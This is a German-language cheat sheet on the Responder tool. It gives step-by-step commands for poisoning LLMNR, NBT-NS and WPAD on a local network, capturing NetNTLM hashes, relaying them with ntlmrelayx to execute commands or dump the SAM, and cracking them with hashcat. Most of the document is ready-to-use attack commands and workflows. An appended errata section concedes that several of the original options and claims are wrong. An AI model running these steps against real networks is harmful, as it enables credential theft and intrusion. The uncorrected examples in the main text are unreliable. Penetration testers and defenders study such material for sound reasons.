# 🎣 Responder - LLMNR/NBT-NS Poisoning

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md)

```
  ██████╗ ███████╗███████╗██████╗  ██████╗ ███╗   ██╗██████╗ ███████╗██████╗ 
  ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗████╗  ██║██╔══██╗██╔════╝██╔══██╗
  ██████╔╝█████╗  ███████╗██████╔╝██║   ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝
  ██╔══██╗██╔══╝  ╚════██║██╔═══╝ ██║   ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
  ██║  ██║███████╗███████║██║     ╚██████╔╝██║ ╚████║██████╔╝███████╗██║  ██║
  ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝
               LLMNR/NBT-NS/mDNS Poisoner
```

<p align="center">
  <img src="https://img.shields.io/badge/Responder-NTLM_Capture-red?style=for-the-badge" alt="Responder">
  <img src="https://img.shields.io/badge/LLMNR-Poisoning-blue?style=for-the-badge" alt="LLMNR">
</p>

---

## 📋 Inhaltsverzeichnis

- [Was ist Responder?](#-was-ist-responder)
- [Installation](#-installation)
- [Grundlegende Verwendung](#-grundlegende-verwendung)
- [NTLMv2-Hashes erfassen](#-ntlmv2-hashes-erfassen)
- [Relay-Angriffe](#-relay-angriffe)
- [Nachgebildete Server](#-nachgebildete-server)
- [Konfiguration](#-konfiguration)
- [Schnellübersicht](#-schnellübersicht)

---

## 🎯 Was ist Responder?

**Responder** fälscht Antworten auf LLMNR-, NBT-NS- und mDNS-Anfragen (Poisoning), um NTLM-Hashes zu erfassen:

- 🎣 **LLMNR-Poisoning** - Link-Local Multicast Name Resolution, Namensauflösung per Multicast im lokalen Netz
- 📡 **NBT-NS-Poisoning** - NetBIOS Name Service, Namensdienst für NetBIOS
- 🍎 **mDNS-Poisoning** - Multicast DNS, DNS-Namensauflösung per Multicast
- 🔓 **Hash-Erfassung** - NTLMv1-/NTLMv2-Hashes
- 🔄 **Relay-Unterstützung** - NTLM-Relay-Angriffe, bei denen Authentifizierungen weitergeleitet werden

### Funktionsweise

```
1. Ein Benutzer gibt einen falschen Hostnamen ein: \\fileservr (Tippfehler)
2. Die DNS-Auflösung schlägt fehl
3. Windows sendet eine LLMNR-/NBT-NS-Anfrage im lokalen Netz
4. Responder antwortet: "I'm fileservr!"
5. Das betroffene System sendet einen NTLM-Hash zur Authentifizierung
6. Der Hash wird zum Knacken oder für Relay-Angriffe erfasst
```

---

## 🚀 Installation

### Kali Linux

```bash
# Vorinstalliert
responder --help

# Aktualisieren
sudo apt update && sudo apt install responder

# Oder von GitHub
git clone https://github.com/lgandx/Responder.git
cd Responder
python Responder.py --help
```

### Installation überprüfen

```bash
responder --help
responder -I eth0 --version
```

---

## 💻 Grundlegende Verwendung

### Responder starten

```bash
# Grundlegende Verwendung (Hashes erfassen)
sudo responder -I eth0

# Ausführliche Ausgabe
sudo responder -I eth0 -v

# Analysemodus (passiv)
sudo responder -I eth0 -A
```

### Netzwerkschnittstelle auswählen

```bash
# Ethernet
sudo responder -I eth0

# WLAN
sudo responder -I wlan0

# Schnittstellen auflisten
ip a
```

---

## 🔓 NTLMv2-Hashes erfassen

### Einfache Erfassung

```bash
# Responder starten
sudo responder -I eth0

# Auf betroffene Systeme warten ...
# Ausgabe:
[+] Listening for events...
[HTTP] NTLMv2 Client   : 192.168.1.100
[HTTP] NTLMv2 Username : DOMAIN\user
[HTTP] NTLMv2 Hash     : user::DOMAIN:1122334455667788:...
```

### NTLMv2 erzwingen

```bash
# Nur NTLMv2 (zum Knacken empfohlen)
sudo responder -I eth0 --lm
```

### Erfassung über WPAD

```bash
# WPAD-Proxy aktivieren
sudo responder -I eth0 -w

# WPAD-Authentifizierung erzwingen
sudo responder -I eth0 -wF
```

### Speicherorte der Hashes

```bash
# Erfasste Hashes werden hier gespeichert:
/usr/share/responder/logs/
# Oder
./logs/

# Dateien:
Responder-Session.log
SMB-NTLMv2-*.txt
HTTP-NTLMv2-*.txt
```

### Erfasste Hashes knacken

```bash
# NTLMv2-Format:
# user::DOMAIN:ServerChallenge:NTProofStr:NTLMv2Response

# Hashcat (Modus 5600)
hashcat -m 5600 hash.txt wordlist.txt

# John
john --format=netntlmv2 hash.txt
```

---

## 🔄 Relay-Angriffe

### SMB/HTTP deaktivieren (für Relay)

```bash
# Responder.conf bearbeiten
sudo nano /usr/share/responder/Responder.conf

# Folgende Werte setzen:
SMB = Off
HTTP = Off
```

### Responder + ntlmrelayx

```bash
# Terminal 1: Responder (ohne SMB/HTTP)
sudo responder -I eth0

# Terminal 2: ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support

# Oder mit Befehlsausführung
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

### Weiterleitung an LDAP

```bash
# Responder
sudo responder -I eth0

# An LDAP weiterleiten
impacket-ntlmrelayx -t ldap://DC01.domain.local
```

### Relay zum Auslesen der SAM

```bash
# SAM beim Relay auslesen
impacket-ntlmrelayx -tf targets.txt -smb2support --sam
```

---

<a name="-nachgebildete-server"></a>

## 🖥️ Nachgebildete Server

### Integrierte Server

| Server | Port | Zweck |
|--------|------|---------|
| SMB | 445 | Authentifizierung an Dateifreigaben |
| HTTP | 80 | Webauthentifizierung |
| HTTPS | 443 | Verschlüsselte Webverbindungen |
| FTP | 21 | FTP-Authentifizierung |
| SQL | 1433 | MSSQL-Authentifizierung |
| LDAP | 389 | Authentifizierung am Verzeichnisdienst |
| WPAD | 80 | Proxykonfiguration |

### Server aktivieren/deaktivieren

```bash
# Responder.conf bearbeiten
[Responder Core]
; Zu startende Server
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
```

### Nachgebildeter WPAD-Proxy

```bash
# WPAD aktivieren
sudo responder -I eth0 -w

# Basic-Authentifizierung für WPAD erzwingen
sudo responder -I eth0 -wF

# Eigenes WPAD-Skript
sudo responder -I eth0 -w --wpad-name wpad.dat
```

### DNS-Spoofing (gefälschte DNS-Antworten)

```bash
# DNS aktivieren
sudo responder -I eth0 -d

# Responder übernimmt die Rolle eines DNS-Servers
# Beantwortet Anfragen für alle Hosts
```

---

<a name="-konfiguration"></a>

## ⚙️ Konfiguration

### Responder.conf

```bash
# Speicherort
/usr/share/responder/Responder.conf
# Oder
./Responder.conf
```

### Wichtige Einstellungen

```ini
[Responder Core]
; Auf On oder Off setzen
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On

; Eigene Challenge (für Rainbow Tables, vorberechnete Tabellen)
Challenge = Random

; Nicht auf lokale Anfragen antworten
DontRespondTo =

; Nur diesen IP-Adressen antworten
RespondTo =
```

### Statische Challenge (Rainbow Tables)

```ini
; Statische Challenge für vorberechnete Tabellen setzen
Challenge = 1122334455667788
```

### Ausschlüsse

```ini
; Diesen IP-Adressen nicht antworten
DontRespondTo = 192.168.1.1, 192.168.1.2

; Nur diesen Adressen antworten
RespondTo = 192.168.1.100, 192.168.1.101
```

---

## 📊 Schnellübersicht

### Wichtige Befehle

| Befehl | Beschreibung |
|---------|-------------|
| `responder -I eth0` | Einfache Erfassung |
| `responder -I eth0 -v` | Ausführliche Ausgabe |
| `responder -I eth0 -A` | Nur analysieren |
| `responder -I eth0 -w` | WPAD aktivieren |
| `responder -I eth0 -wF` | WPAD-Authentifizierung erzwingen |
| `responder -I eth0 -d` | DNS aktivieren |

### Optionen

| Option | Beschreibung |
|------|-------------|
| `-I` | Netzwerkschnittstelle |
| `-v` | Ausführliche Ausgabe |
| `-A` | Analysemodus (passiv) |
| `-w` | WPAD aktivieren |
| `-wF` | WPAD-Authentifizierung erzwingen |
| `-d` | DNS aktivieren |
| `-f` | Hosts anhand ihrer Merkmale erkennen (Fingerprinting) |
| `-b` | Basic-Authentifizierung anfordern |

### Hash-Typen

| Typ | Hashcat-Modus | John-Format |
|------|--------------|-------------|
| NTLMv1 | 5500 | netntlm |
| NTLMv2 | 5600 | netntlmv2 |

### Angriffsablauf

```bash
# 1. Responder starten
sudo responder -I eth0 -wFv

# 2. Auf Hashes warten
# Hashes werden unter ./logs/ gespeichert

# 3. Hashes knacken
hashcat -m 5600 ./logs/*NTLM*.txt rockyou.txt

# 4. Oder weiterleiten (SMB zuvor deaktivieren)
sudo responder -I eth0  # SMB=Off in der Konfiguration
impacket-ntlmrelayx -tf targets.txt -smb2support
```

### Relay-Ablauf

```bash
# 1. Ziele ohne SMB-Signierung finden
cme smb 10.10.10.0/24 --gen-relay-list relay.txt

# 2. Responder.conf konfigurieren
# SMB = Off
# HTTP = Off

# 3. Responder starten
sudo responder -I eth0

# 4. Relay starten
impacket-ntlmrelayx -tf relay.txt -smb2support

# 5. Auf weitergeleitete Authentifizierungen warten
```

---

## 📚 Weiterführende Quellen

- [Responder GitHub](https://github.com/lgandx/Responder)
- [LLMNR-Poisoning](https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/)
- [ntlmrelayx](https://github.com/fortra/impacket)

### Verwandte Cheatsheets
- [Impacket](../../Impacket/translations/README.de.md)
- [CrackMapExec](../../CrackMapExec/translations/README.de.md)
- [Hashcat](../../Hashcat/translations/README.de.md)

---

## 📝 Ergänzende Hinweise zu den Originalbeispielen

Die Beispiele und ihre ursprünglichen Beschriftungen bleiben erhalten; folgende Einschränkungen sind für ihre Einordnung wichtig (Quellenprüfung: 02.11.2026):

- **NTLM-Begriffe:** Die als NTLM-Hashes bezeichneten Netzwerkaufzeichnungen enthalten NetNTLM-Challenge-Response-Daten, nicht den gespeicherten NT-Hash oder das Klartextpasswort. Sie sind deshalb kein direktes Pass-the-Hash-Material. Relay setzt einen laufenden Authentifizierungsaustausch voraus; eine gespeicherte Antwortzeile ersetzt diesen nicht. [Microsoft: NTLMv2-Berechnung](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/5e550938-91d4-459f-b67d-75d70009e3f3), [ntlmrelayx-Quelltext](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py).
- **Responder-Optionen:** Im geprüften offiziellen Parser erzwingt `--lm` einen LM-Downgrade für ältere Systeme, nicht NTLMv2. `-d` aktiviert DHCP-Poisoning mit WPAD-Injektion, keinen DNS-Server. `-F` fordert NTLM-/Basic-Authentifizierung beim Abruf der WPAD-Datei an; Basic allein wird durch `-b` ausgewählt. `--wpad-name` ist dort nicht definiert. [Offizieller Optionsparser](https://github.com/lgandx/Responder/blob/master/Responder.py).
- **Versionen:** Auch `--sam` fehlt im geprüften aktuellen ntlmrelayx-Parser; das entsprechende Originalbeispiel ist daher keine allgemein gültige aktuelle Syntax. Verhalten und verfügbare Optionen hängen von der installierten Version ab. [Offizieller ntlmrelayx-Parser](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py).
- **Konfiguration und Challenge:** Ein leeres `DontRespondTo` schließt keine IP-Adressen aus und unterdrückt lokale Anfragen nicht pauschal. `Challenge = Random` erzeugt wechselnde Challenges. Eine feste Server-Challenge macht NTLMv2 nicht allgemein mit Rainbow Tables lösbar: Die Antwort hängt zusätzlich unter anderem von Client-Challenge, Zeitstempel und Zieldaten ab. [Responder-Konfiguration](https://github.com/lgandx/Responder/blob/master/Responder.conf), [Microsoft: NTLMv2-Berechnung](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/5e550938-91d4-459f-b67d-75d70009e3f3).
- **Voraussetzungen für Relay:** Erforderliche Dienste müssen erreichbar und benötigte lokale Ports verfügbar sein; bei parallelem Betrieb betrifft die gezeigte Konfiguration sowohl SMB als auch HTTP. Eine verwertbare Authentifizierung, passende Kontorechte und die Schutzmechanismen des Zielprotokolls bestimmen das Ergebnis. Insbesondere erforderliche SMB-Signierung schützt vor den klassischen SMB-Relay-Angriffen. [Responder-Dokumentation](https://github.com/lgandx/Responder/blob/master/README.md), [Microsoft: SMB-Signierung](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing-overview).
- **Hashdateien:** Die Formatzeile und die Ausgabe mit `...` sind schematisch. Beim NetNTLMv2-Dateiformat folgt auf `NTProofStr` der Client-Blob; die Bezeichnung `NTLMv2Response` im Original ist hier ungenau. Der Platzhalter `./logs/*NTLM*.txt` kann verschiedene Formate erfassen; Modus `5600` passt zu NetNTLMv2, `5500` zu NetNTLMv1. [Hashcat-Beispielformate](https://hashcat.net/wiki/doku.php?id=example_hashes).

---

<p align="center">
  <b>🎣 Auf Hash-Fang!</b><br>
  <i>Responder - Zugangsdaten im Netzwerk erfassen</i>
</p>
